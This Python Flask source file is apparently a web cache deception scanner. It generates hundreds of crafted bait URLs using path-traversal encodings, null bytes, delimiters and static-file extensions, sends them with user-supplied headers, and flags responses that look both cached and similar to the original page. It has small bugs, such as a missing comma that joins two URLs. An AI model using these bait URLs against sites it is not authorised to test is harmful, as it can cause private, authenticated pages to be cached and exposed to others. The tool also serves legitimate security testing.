from flask import Flask, request, render_template
import asyncio
import aiohttp
import difflib
import requests
from urllib.parse import urlparse

app = Flask(__name__)

STATIC_DIRS = ['static', 'assets', 'resources', 'public']

EXTENSIONS = [
    "7z", "csv", "gif", "midi", "png", "tif", "zip", "avi", "doc", "gz", "mkv", "ppt", "tiff", "zst",
    "avif", "docx", "ico", "mp3", "pptx", "ttf", "css", "apk", "dmg", "iso", "mp4", "ps", "webm", "flac",
    "bin", "ejs", "jar", "ogg", "rar", "webp", "mid", "bmp", "eot", "jpg", "otf", "svg", "woff", "pls",
    "bz2", "eps", "jpeg", "pdf", "svgz", "woff2", "tar", "class", "exe", "js", "pict", "swf", "xls", "xlsx"
]

DELIMITERS = [
    "!", "\"", "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?",
    "@", "[", "\\", "]", "^", "_", "`", "{", "|", "}", "~", "%21", "%22", "%23", "%24", "%25", "%26", "%27", "%28", "%29", "%2A", "%2B", "%2C", "%2D",
    "%2E", "%2F", "%3A", "%3B", "%3C", "%3D", "%3E", "%3F", "%40", "%5B", "%5C", "%5D",
    "%5E", "%5F", "%60", "%7B", "%7C", "%7D", "%7E"
]

CANARY = "wcdtest"

CACHE_HEADERS_TO_CAPTURE = [
    'Cache-Control', 'Age', 'ETag', 'Expires', 'Last-Modified', 'Vary',
    'X-Cache', 'X-Cache-Status', 'CF-Cache-Status', 'CDN-Cache-Control',
    'X-Served-By', 'X-Cache-Hits', 'Cache-Status'
]

def parse_headers(header_str):
    headers = {}
    lines = header_str.strip().splitlines()
    for line in lines:
        if ':' in line:
            key, value = line.split(':', 1)
            headers[key.strip()] = value.strip()
    return headers

def generate_bypass_urls(base_url):
    parsed = urlparse(base_url)
    scheme_host = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path.strip('/') or 'index'
    urls = []

    for static in STATIC_DIRS:
        encoded = f"{scheme_host}/{path}%23%2f%2e%2e%2f{static}?{CANARY}"
        urls.append(encoded)

    base = path.split('/')
    if len(base) >= 2:
        prefix = base[0]
        suffix = '/'.join(base[1:])
        for d in DELIMITERS:
            urls.append(f"{scheme_host}/{prefix}{d}{CANARY}/{suffix}")

    for ext in EXTENSIONS:
        urls.append(f"{scheme_host}/{path}%00.{ext}")
        urls.append(f"{scheme_host}/{path}%0a.{ext}")
        urls.append(f"{scheme_host}/{path}.{ext}")
        urls.append(f"{scheme_host}/{path}/{CANARY}.{ext}")
        for d in DELIMITERS:
            urls.append(f"{scheme_host}/{path}{d}{CANARY}.{ext}")

    for static in STATIC_DIRS:
        urls.append(f"{scheme_host}/{path}$%2F%2E%2E%2F{static}%2F{CANARY}")
        urls.append(f"{scheme_host}/{static}/..%2F{path}?{CANARY}")
        urls.append(f"{scheme_host}/{static}/..\\{path}?{CANARY}")
        urls.append(f"{scheme_host}/{path}$%2F%2E%2E/{static}")
        urls.append(f"{scheme_host}/{static}#/../{path}?{CANARY}")


    urls += [
        f"{scheme_host}/{path}$%2F%2E%2E/robots.txt?{CANARY}",
        f"{scheme_host}/{path};%2F%2E%2E/robots.txt?{CANARY}",
        f"{scheme_host}/{path};%2F%2E%2E%2Frobots.txt?{CANARY}"
        f"{scheme_host}/{path}/../%73tyles.css",
        f"{scheme_host}/{CANARY}%2F%2E%2E%2F{path}"
    ]

    return list(set(urls))

def is_cache_explicit(headers):
    values = [
        headers.get('Cache-Status', ''),
        headers.get('X-Cache', ''),
        headers.get('CF-Cache-Status', ''),
        headers.get('X-Cache-Status', '')
    ]
    v_all = ' '.join(values).lower()
    return any(x in v_all for x in ['hit', 'miss', 'Miss from cloudfront'])

async def fetch_url(session, url, headers, base_resp_text, semaphore, result_holder):
    async with semaphore:
        if result_holder['found']:
            return None
        try:
            async with session.get(url, timeout=10, headers=headers) as resp:
                text = await resp.text()
                cache_control = resp.headers.get('Cache-Control', '').lower()
                is_similar = difflib.SequenceMatcher(None, base_resp_text, text).ratio() > 0.8
                cache_explicit = is_cache_explicit(resp.headers)
                possible = is_similar and cache_explicit

                if possible:
                    result_holder['found'] = True

                captured_headers = {
                    h: resp.headers.get(h, '') for h in CACHE_HEADERS_TO_CAPTURE
                }

                return {
                    'url': url,
                    'cached': cache_explicit,
                    'similar': is_similar,
                    'possible': possible,
                    'headers': cache_control,
                    'cache_info': captured_headers
                }
        except Exception as e:
            return {
                'url': url,
                'cached': False,
                'similar': False,
                'possible': False,
                'headers': f'error: {e}'
            }

async def run_parallel_requests(urls, headers, base_resp_text):
    semaphore = asyncio.Semaphore(8)
    result_holder = {'found': False}
    results = []
    async with aiohttp.ClientSession() as session:
        tasks = [
            fetch_url(session, url, headers, base_resp_text, semaphore, result_holder)
            for url in urls
        ]
        for coro in asyncio.as_completed(tasks):
            result = await coro
            if result:
                results.append(result)
            if result_holder['found']:
                break
    return results

def scan_url(url, headers):
    base_resp = requests.get(url, timeout=10, headers=headers)
    base_cache_control = base_resp.headers.get('Cache-Control', '').lower()

    if 'no-store' in base_cache_control or 'private' in base_cache_control:
        return [{
	    'url': url,
	    'cached': False,
	    'similar': False,
	    'possible': False,
	    'headers': base_cache_control,
	    'note': 'Base path is uncacheable, skipping full scan.'
        }]
    bait_urls = generate_bypass_urls(url)
    return asyncio.run(run_parallel_requests(bait_urls, headers, base_resp.text))


@app.route('/', methods=['GET', 'POST'])
def index():
    results = None
    if request.method == 'POST':
        url = request.form.get('url')
        headers_raw = request.form.get('headers', '')
        headers = parse_headers(headers_raw)
        results = scan_url(url, headers)
    return render_template('index.html', results=results)

if __name__ == '__main__':
    app.run(debug=True)
